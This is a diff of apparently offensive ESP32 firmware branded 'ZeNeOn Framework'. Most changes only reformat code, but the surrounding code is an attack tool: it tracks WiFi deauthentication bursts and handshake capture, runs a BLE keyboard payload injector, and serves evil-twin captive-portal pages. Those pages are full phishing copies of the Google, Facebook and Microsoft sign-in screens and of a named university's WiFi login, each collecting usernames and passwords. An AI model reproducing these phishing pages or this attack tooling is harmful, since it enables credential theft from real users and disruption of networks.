@@ -1,20 +1,21 @@
 #include "SPIFFS.h"
+#include "esp_bt.h"
+#include "esp_bt_defs.h"
+#include "esp_bt_main.h"
 #include "esp_event.h"
+#include "esp_gap_ble_api.h"
 #include "esp_system.h"
 #include "esp_wifi.h"
 #include "esp_wifi_types.h"
-#include <DNSServer.h>
-#include <WebServer.h>
-#include <WiFi.h>
-#include "esp_bt.h"
-#include "esp_bt_main.h"
-#include "esp_gap_ble_api.h"
-#include "esp_bt_defs.h"
-#include <SPI.h>
-#include <RF24.h>
-#include <BleKeyboard.h>
 #include "nvs.h"
 #include "nvs_flash.h"
+#include <BleKeyboard.h>
+#include <DNSServer.h>
+#include <RF24.h>
+#include <SPI.h>
+#include <WebServer.h>
+#include <WiFi.h>
+
 
 WebServer server(80);
 DNSServer dnsServer;
@@ -44,13 +45,14 @@ int spamCount = 0;
 uint32_t deauthPktsSent = 0;
 uint32_t totalPacketsCaptured = 0;
 uint8_t eapolFramesDetected = 0;
-uint16_t captureDownloadCount = 0;  // sequential capture file numbering
+uint16_t captureDownloadCount = 0; // sequential capture file numbering
 
 /* ============ PAYLOAD INJECTOR (BLE HID KEYBOARD) ============ */
-String bleDeviceName = "ZeNeOn";  // user-configurable BLE device name
+String bleDeviceName = "ZeNeOn"; // user-configurable BLE device name
 BleKeyboard bleKeyboard("ZeNeOn", "ZeNeOn Framework", 100);
-bool bleKbStarted = false;        // user-facing "active" flag
-bool bleNimbleReady = false;      // true after first bleKeyboard.begin() — never end() after this
+bool bleKbStarted = false; // user-facing "active" flag
+bool bleNimbleReady =
+    false; // true after first bleKeyboard.begin() — never end() after this
 bool payloadExecuting = false;
 String payloadBuffer = "";
 int payloadOffset = 0;
@@ -59,24 +61,28 @@ int payloadTotalLines = 0;
 unsigned long payloadNextExecTime = 0;
 String payloadStatus = "idle";
 String lastPayloadLine = "";
-unsigned long bleDisconnectTime = 0;  // millis() when disconnect detected (grace period)
+unsigned long bleDisconnectTime =
+    0; // millis() when disconnect detected (grace period)
 const unsigned long BLE_RECONNECT_GRACE_MS = 8000; // 8s grace before aborting
-bool bleWasConnected = false;         // track previous connection state
-unsigned long bleLastConnChange = 0;  // millis() of last connect/disconnect event
-const unsigned long BLE_CONN_SETTLE_MS = 2000; // ignore state changes during settle period
-uint8_t bleReconnectCount = 0;              // rapid reconnection counter
-unsigned long bleReconnectWindowStart = 0;  // window start for counting
-const uint8_t BLE_MAX_RECONNECTS = 3;       // max reconnects in window before auto-fix
+bool bleWasConnected = false; // track previous connection state
+unsigned long bleLastConnChange =
+    0; // millis() of last connect/disconnect event
+const unsigned long BLE_CONN_SETTLE_MS =
+    2000;                      // ignore state changes during settle period
+uint8_t bleReconnectCount = 0; // rapid reconnection counter
+unsigned long bleReconnectWindowStart = 0; // window start for counting
+const uint8_t BLE_MAX_RECONNECTS =
+    3; // max reconnects in window before auto-fix
 const unsigned long BLE_RECONNECT_WINDOW_MS = 15000; // 15s window
 
 /* ============ WIFI AP WATCHDOG ============ */
 unsigned long lastAPCheck = 0;
-const unsigned long AP_CHECK_INTERVAL = 10000;  // check every 10s
+const unsigned long AP_CHECK_INTERVAL = 10000; // check every 10s
 unsigned long lastHeapLog = 0;
-const unsigned long HEAP_LOG_INTERVAL = 30000;  // log heap every 30s
+const unsigned long HEAP_LOG_INTERVAL = 30000; // log heap every 30s
 unsigned long apRestartCount = 0;
 bool apRecoveryInProgress = false;
-void restartWiFiAP();  // forward declaration
+void restartWiFiAP(); // forward declaration
 
 /* ============ AUTOMATED ATTACK PHASES ============ */
 enum AttackPhase {
@@ -107,7 +113,8 @@ uint8_t deauthCycles = 0;
 // Phase timing (milliseconds)
 const unsigned long PRE_CAPTURE_MS = 5000;  // 5s beacon capture
 const unsigned long DEAUTH_BURST_MS = 5000; // 5s aggressive deauth burst
-const unsigned long LISTEN_MS = 12000;      // 12s listen for handshake (clients need time to reconnect)
+const unsigned long LISTEN_MS =
+    12000; // 12s listen for handshake (clients need time to reconnect)
 
 File pcapFile;
 String targetSSID = "";
@@ -847,16 +854,24 @@ var doLogin=function(e){
 }
 </script>)rawliteral";
 
-  String loaderCSS = ".lo{display:none;position:absolute;top:0;left:0;right:0;bottom:0;background:rgba(255,255,255,0.95);z-index:1000;align-items:center;justify-content:center;flex-direction:column}"
-    ".sp{width:36px;height:36px;border:3px solid #ddd;border-top:3px solid #0066cc;border-radius:50%;animation:spin .8s linear infinite;margin-bottom:16px}"
-    "@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}"
-    ".st{font-weight:600;margin-bottom:6px;color:#333}.sd{font-size:14px;color:#666}";
+  String loaderCSS =
+      ".lo{display:none;position:absolute;top:0;left:0;right:0;bottom:0;"
+      "background:rgba(255,255,255,0.95);z-index:1000;align-items:center;"
+      "justify-content:center;flex-direction:column}"
+      ".sp{width:36px;height:36px;border:3px solid #ddd;border-top:3px solid "
+      "#0066cc;border-radius:50%;animation:spin .8s linear "
+      "infinite;margin-bottom:16px}"
+      "@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}"
+      ".st{font-weight:600;margin-bottom:6px;color:#333}.sd{font-size:14px;"
+      "color:#666}";
 
-  String loaderHTML = "<div class='lo' id='lo'><div class='sp'></div><div class='st' id='stxt'>Authenticating...</div><div class='sd' id='sdtl'>Please wait</div></div>";
+  String loaderHTML = "<div class='lo' id='lo'><div class='sp'></div><div "
+                      "class='st' id='stxt'>Authenticating...</div><div "
+                      "class='sd' id='sdtl'>Please wait</div></div>";
 
   switch (portalTemplate) {
-    case 1: // Google Sign-In
-      return R"rawliteral(
+  case 1: // Google Sign-In
+    return R"rawliteral(
 <!DOCTYPE html><html><head>
 <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
 <title>Sign in - Google Accounts</title>
@@ -878,12 +893,15 @@ body{background:#f0f4f9;min-height:100vh;display:flex;align-items:center;justify
 .btn:hover{background:#1765cc;box-shadow:0 1px 3px rgba(0,0,0,0.2)}
 .ft{margin-top:32px;display:flex;justify-content:space-between;font-size:12px;color:#5f6368}
 .ft a{color:#5f6368;text-decoration:none}
-)rawliteral" + loaderCSS + R"rawliteral(
+)rawliteral" +
+           loaderCSS + R"rawliteral(
 </style></head><body>
-<div class="box">)rawliteral" + loaderHTML + R"rawliteral(
+<div class="box">)rawliteral" +
+           loaderHTML + R"rawliteral(
 <div class="logo"><span class="g1">G</span><span class="g2">o</span><span class="g3">o</span><span class="g4">g</span><span class="g5">l</span><span class="g6">e</span></div>
 <div class="sub">Sign in</div>
-<div class="sub2">to continue to )rawliteral" + ssid + R"rawliteral(</div>
+<div class="sub2">to continue to )rawliteral" +
+           ssid + R"rawliteral(</div>
 <form id="lf" onsubmit="doLogin(event)">
 <div class="fg"><input type="text" id="u" name="username" placeholder="Email or phone" required></div>
 <div class="fg"><input type="password" id="p" name="password" placeholder="Enter your password" required></div>
@@ -891,10 +909,11 @@ body{background:#f0f4f9;min-height:100vh;display:flex;align-items:center;justify
 <button type="submit" class="btn">Next</button>
 </form>
 <div class="ft"><a href="#" onclick="return false">Create account</a><a href="#" onclick="return false">Help</a></div>
-</div>)rawliteral" + submitJS + "</body></html>";
+</div>)rawliteral" +
+           submitJS + "</body></html>";
 
-    case 2: // Facebook Login
-      return R"rawliteral(
+  case 2: // Facebook Login
+    return R"rawliteral(
 <!DOCTYPE html><html><head>
 <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
 <title>Log in to Facebook</title>
@@ -916,11 +935,13 @@ body{background:#f0f2f5;min-height:100vh;display:flex;align-items:center;justify
 .fl{display:block;text-align:center;color:#1877f2;text-decoration:none;font-size:14px;margin-bottom:20px}
 .new{display:block;width:fit-content;margin:0 auto;padding:12px 24px;background:#42b72a;color:#fff;border:none;border-radius:6px;font-size:17px;font-weight:700;cursor:pointer;text-decoration:none}
 .ft{text-align:center;margin-top:24px;font-size:12px;color:#8a8d91}
-)rawliteral" + loaderCSS + R"rawliteral(
+)rawliteral" +
+           loaderCSS + R"rawliteral(
 </style></head><body>
 <div class="wrap">
 <div class="logo"><h1>facebook</h1></div>
-<div class="box">)rawliteral" + loaderHTML + R"rawliteral(
+<div class="box">)rawliteral" +
+           loaderHTML + R"rawliteral(
 <form id="lf" onsubmit="doLogin(event)">
 <div class="fg"><input type="text" id="u" name="username" placeholder="Email address or phone number" required></div>
 <div class="fg"><input type="password" id="p" name="password" placeholder="Password" required></div>
@@ -930,11 +951,13 @@ body{background:#f0f2f5;min-height:100vh;display:flex;align-items:center;justify
 <div class="sep"><span>or</span></div>
 <a href="#" class="new" onclick="return false">Create new account</a>
 </div>
-<div class="ft"><p>WiFi requires authentication via )rawliteral" + ssid + R"rawliteral(</p></div>
-</div>)rawliteral" + submitJS + "</body></html>";
+<div class="ft"><p>WiFi requires authentication via )rawliteral" +
+           ssid + R"rawliteral(</p></div>
+</div>)rawliteral" +
+           submitJS + "</body></html>";
 
-    case 3: // Microsoft Account
-      return R"rawliteral(
+  case 3: // Microsoft Account
+    return R"rawliteral(
 <!DOCTYPE html><html><head>
 <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
 <title>Sign in to your account</title>
@@ -959,12 +982,15 @@ body{background:#f2f2f2;min-height:100vh;display:flex;align-items:center;justify
 .btn{padding:9px 16px;background:#0067b8;color:#fff;border:none;font-size:15px;font-weight:600;cursor:pointer;float:right;min-width:108px}
 .btn:hover{background:#005da3}
 .ft{clear:both;padding-top:36px;font-size:12px;color:#666}
-)rawliteral" + loaderCSS + R"rawliteral(
+)rawliteral" +
+           loaderCSS + R"rawliteral(
 </style></head><body>
-<div class="box">)rawliteral" + loaderHTML + R"rawliteral(
+<div class="box">)rawliteral" +
+           loaderHTML + R"rawliteral(
 <div class="logo"><div class="ms"><div></div><div></div><div></div><div></div></div><span>Microsoft</span></div>
 <div class="title">Sign in</div>
-<div class="sub">to access )rawliteral" + ssid + R"rawliteral(</div>
+<div class="sub">to access )rawliteral" +
+           ssid + R"rawliteral(</div>
 <form id="lf" onsubmit="doLogin(event)">
 <div class="fg"><input type="text" id="u" name="username" placeholder="Email, phone, or Skype" required></div>
 <div class="fg"><input type="password" id="p" name="password" placeholder="Password" required></div>
@@ -972,10 +998,11 @@ body{background:#f2f2f2;min-height:100vh;display:flex;align-items:center;justify
 <button type="submit" class="btn">Sign in</button>
 </form>
 <div class="ft">No account? <a href="#" style="color:#0067b8;text-decoration:none" onclick="return false">Create one!</a></div>
-</div>)rawliteral" + submitJS + "</body></html>";
+</div>)rawliteral" +
+           submitJS + "</body></html>";
 
-    case 4: // SLIIT WiFi Login
-      return R"rawliteral(
+  case 4: // SLIIT WiFi Login
+    return R"rawliteral(
 <!DOCTYPE html><html><head>
 <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
 <title>Sign in to SLIIT-STD</title>
@@ -995,9 +1022,11 @@ body{background:#fff;min-height:100vh;display:flex;align-items:center;justify-co
 .fg input:focus{outline:none;border-color:#5b9bd5}
 .btn{padding:8px 24px;background:#337ab7;color:#fff;border:1px solid #2e6da4;border-radius:4px;font-size:14px;font-weight:400;cursor:pointer;margin-top:8px;margin-left:90px}
 .btn:hover{background:#286090;border-color:#204d74}
-)rawliteral" + loaderCSS + R"rawliteral(
+)rawliteral" +
+           loaderCSS + R"rawliteral(
 </style></head><body>
-<div class="box">)rawliteral" + loaderHTML + R"rawliteral(
+<div class="box">)rawliteral" +
+           loaderHTML + R"rawliteral(
 <div class="logo"><img src="data:image/png;base64,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" alt="SLIIT UNI"></div>
 <div class="title">SLIIT WIFI FOR BYOD</div>
 <div class="auth">Authentication Required</div>
@@ -1007,10 +1036,11 @@ body{background:#fff;min-height:100vh;display:flex;align-items:center;justify-co
 <div class="fg"><label>Password</label><input type="password" id="p" name="password" required></div>
 <button type="submit" class="btn">Continue</button>
 </form>
-</div>)rawliteral" + submitJS + "</body></html>";
+</div>)rawliteral" +
+           submitJS + "</body></html>";
 
-    default: // Generic WiFi Login (template 0)
-      return R"rawliteral(
+  default: // Generic WiFi Login (template 0)
+    return R"rawliteral(
 <!DOCTYPE html><html><head>
 <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
